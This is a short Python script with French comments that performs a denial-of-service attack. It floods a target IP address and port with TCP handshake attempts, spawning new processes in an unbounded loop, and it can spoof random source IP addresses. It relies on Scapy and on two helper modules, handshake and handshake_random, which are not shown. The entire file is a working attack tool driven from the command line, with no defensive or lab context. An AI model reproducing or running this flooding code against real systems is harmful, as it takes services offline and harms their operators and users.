#!/usr/bin/python3.5
# -*- coding=utf-8 -*-

#Ce script permet de faire une attaque DOS (TCP 3 ways handshake)
#Voir handshake.py pour savoir plus

import sys
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)#Ignorer l'erreur de IPv6 lors l'utilisation de Scapy
from scapy.all import *
from handshake import handshake
from handshake_random import handshake_random
import multiprocessing
import optparse

def handshake_dos(ip, port, random=False):
	if random == False:#On utilise IP de la machine locale
		while True:
            #Multiprocesseur:lancer la fonction handkshake_dos
			handshake_attack = multiprocessing.Process(target=handshake, args=(ip, port))
			handshake_attack.start()
	else:#On utilise une adresse IP aléatoire
		while True:
			handshake_random_attack = multiprocessing.Process(target=handshake_random, args=(ip, port))
			handshake_random_attack.start()


if __name__ == '__main__':
	#Example
	parser = optparse.OptionParser("python3.5 handshake_dos.py -d <IP cible> -p <Port cible> -r <1:Random IP, 2:No Random IP(défault）>")
	parser.add_option('-d', dest = 'dst_ip', type = 'string', help = 'IP cible')
	parser.add_option('-p', dest = 'dst_port', type = 'int', help = 'Port cible')
	parser.add_option('-r', dest = 'random', type = 'int', help = 'Random IP')
	(options, args) = parser.parse_args()
	#Montrer l'example si la commande sans paramètre
	if (options.dst_ip == None) or (options.dst_port == None):
		print(parser.usage)
		exit(0)
	else:
		destination_ip = options.dst_ip
		destination_port = options.dst_port
	if options.random == 1:
		handshake_dos(destination_ip, destination_port, random = True)
	else:
		handshake_dos(destination_ip, destination_port)



